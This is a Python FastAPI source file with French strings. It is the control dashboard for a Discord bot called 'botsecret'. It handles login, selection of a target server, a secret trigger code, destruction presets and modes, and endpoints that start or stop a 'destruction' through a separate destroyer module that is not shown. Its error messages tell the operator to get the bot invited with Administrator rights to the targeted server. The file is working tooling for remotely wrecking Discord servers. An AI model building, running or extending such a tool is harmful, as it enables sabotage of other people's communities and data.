"""Serveur web : authentification, dashboard, API de contrôle."""

from __future__ import annotations

import hmac
import logging
import secrets
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import FastAPI, Form, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware

from . import bot as bot_module
from . import config, db, destroyer, modes

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s"
)
log = logging.getLogger("botsecret")

BASE_DIR = Path(__file__).resolve().parent
templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))


@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init()
    if config.GENERATED_PASSWORD:
        log.warning(
            "DASHBOARD_PASSWORD absent, mot de passe généré : %s",
            config.GENERATED_PASSWORD,
        )
    if not config.DISCORD_TOKEN:
        log.warning("DISCORD_TOKEN absent : le bot ne se connectera pas")
    bot_module.start_bot()
    try:
        yield
    finally:
        await bot_module.shutdown()


app = FastAPI(title="botsecret", lifespan=lifespan, docs_url=None, redoc_url=None)
app.add_middleware(
    SessionMiddleware,
    secret_key=config.SECRET_KEY,
    max_age=config.SESSION_MAX_AGE,
    same_site="lax",
    https_only=config.COOKIE_SECURE,
)
app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")


def password() -> str:
    return config.DASHBOARD_PASSWORD or config.GENERATED_PASSWORD


def is_authed(request: Request) -> bool:
    return bool(request.session.get("auth"))


def require_api(request: Request) -> None:
    if not is_authed(request):
        raise HTTPException(status_code=401, detail="Non authentifié")


@app.get("/healthz")
async def healthz() -> JSONResponse:
    return JSONResponse({"status": "ok"})


@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    if is_authed(request):
        return RedirectResponse("/", status_code=303)
    return templates.TemplateResponse(
        request=request, name="login.html", context={"error": None}
    )


@app.post("/login", response_class=HTMLResponse)
async def login_submit(
    request: Request, password_field: str = Form("", alias="password")
):
    expected = password()
    if expected and hmac.compare_digest(password_field, expected):
        request.session["auth"] = True
        return RedirectResponse("/", status_code=303)
    return templates.TemplateResponse(
        request=request,
        name="login.html",
        context={"error": "Mot de passe incorrect."},
        status_code=401,
    )


@app.post("/logout")
async def logout(request: Request):
    request.session.clear()
    return RedirectResponse("/login", status_code=303)


@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    if not is_authed(request):
        return RedirectResponse("/login", status_code=303)
    return templates.TemplateResponse(
        request=request,
        name="dashboard.html",
        context={
            "secret_code": db.get_secret_code(),
            "guild_id": db.get_guild_id() or "",
            "preset": db.get_preset(),
            "modes": modes.list_modes(),
            "default_mode": db.get_default_mode(),
        },
    )


@app.get("/api/state")
async def api_state(request: Request) -> JSONResponse:
    require_api(request)
    return JSONResponse(
        {
            "bot": bot_module.guild_info(),
            "guilds": bot_module.list_guilds(),
            "guild_id": db.get_guild_id(),
            "secret_code": db.get_secret_code(),
            "preset": db.get_preset(),
            "modes": modes.list_modes(),
            "default_mode": db.get_default_mode(),
            "destruction": destroyer.state.snapshot(),
            "logs": db.get_logs(80),
        }
    )


@app.post("/api/preset")
async def api_preset(request: Request) -> JSONResponse:
    require_api(request)
    data = await request.json()
    if not isinstance(data, dict):
        raise HTTPException(status_code=400, detail="Corps JSON invalide")
    preset = db.save_preset(data)
    db.add_log("info", "preset de destruction enregistré")
    return JSONResponse({"ok": True, "preset": preset})


@app.post("/api/secret")
async def api_secret(request: Request) -> JSONResponse:
    require_api(request)
    data = await request.json()
    code = str(data.get("code", "")).strip()
    if len(code) < 3:
        raise HTTPException(
            status_code=400, detail="Code trop court (3 caractères minimum)"
        )
    db.set_secret_code(code)
    db.add_log("info", "code secret mis à jour")
    return JSONResponse({"ok": True, "code": code})


@app.post("/api/secret/regenerate")
async def api_secret_regenerate(request: Request) -> JSONResponse:
    require_api(request)
    code = secrets.token_urlsafe(9)
    db.set_secret_code(code)
    db.add_log("info", "code secret régénéré")
    return JSONResponse({"ok": True, "code": code})


@app.post("/api/guild")
async def api_guild(request: Request) -> JSONResponse:
    require_api(request)
    data = await request.json()
    raw = data.get("guild_id")
    if raw in (None, "", 0, "0"):
        db.set_guild_id(None)
        db.add_log("info", "guilde cible effacée")
        return JSONResponse({"ok": True, "guild_id": None})
    try:
        guild_id = int(raw)
    except (TypeError, ValueError):
        raise HTTPException(status_code=400, detail="Identifiant de guilde invalide")
    db.set_guild_id(guild_id)
    db.add_log("info", f"guilde cible définie : {guild_id}")
    return JSONResponse({"ok": True, "guild_id": guild_id})


@app.post("/api/default-mode")
async def api_default_mode(request: Request) -> JSONResponse:
    require_api(request)
    data = await request.json()
    mode = str(data.get("mode", "custom"))
    if mode not in ("custom", *modes.MODES.keys()):
        raise HTTPException(status_code=400, detail="Mode inconnu")
    db.set_default_mode(mode)
    db.add_log("info", f"mode par défaut : {mode}")
    return JSONResponse({"ok": True, "mode": mode})


@app.post("/api/sync")
async def api_sync(request: Request) -> JSONResponse:
    require_api(request)
    try:
        message = await bot_module.sync_commands()
    except Exception as exc:  # noqa: BLE001
        db.add_log("error", f"synchronisation impossible : {exc}")
        raise HTTPException(status_code=502, detail=str(exc))
    db.add_log("info", message)
    return JSONResponse({"ok": True, "message": message})


@app.post("/api/destroy")
async def api_destroy(request: Request) -> JSONResponse:
    require_api(request)
    try:
        body = await request.json()
    except Exception:  # noqa: BLE001
        body = {}
    mode = str((body or {}).get("mode", "custom")) if isinstance(body, dict) else "custom"
    preset = modes.build(mode, db.get_preset())
    if preset is None:
        raise HTTPException(status_code=400, detail="Mode inconnu")
    guild = bot_module._target_guild()
    if guild is None:
        info = bot_module.guild_info()
        diag = info["diagnostics"]
        if not diag["token_present"]:
            detail = "DISCORD_TOKEN absent : renseigne la variable d'environnement sur Render puis relance la connexion"
        elif diag["last_error"]:
            detail = f"bot hors ligne ({diag['last_error']}) : vérifie le token et les intents, puis relance la connexion"
        elif diag["guild_id_set"]:
            detail = (
                "le bot est connecté mais absent de ce serveur : invite-le avec "
                "le scope applications.commands + Administrateur, ou corrige l'identifiant"
            )
        elif diag["guild_count"] > 1:
            detail = "plusieurs serveurs visibles : définis l'identifiant de la cible"
        else:
            detail = "aucun serveur cible : invite le bot sur un serveur puis définis l'identifiant"
        raise HTTPException(status_code=400, detail=detail)
    if not destroyer.start(guild, preset, mode):
        raise HTTPException(status_code=409, detail="Destruction déjà en cours")
    return JSONResponse({"ok": True, "mode": mode})


@app.post("/api/stop")
async def api_stop(request: Request) -> JSONResponse:
    require_api(request)
    return JSONResponse({"ok": destroyer.stop()})


@app.post("/api/bot/restart")
async def api_bot_restart(request: Request) -> JSONResponse:
    require_api(request)
    message = await bot_module.restart()
    return JSONResponse({"ok": True, "message": message})


@app.post("/api/logs/clear")
async def api_logs_clear(request: Request) -> JSONResponse:
    require_api(request)
    db.clear_logs()
    return JSONResponse({"ok": True})
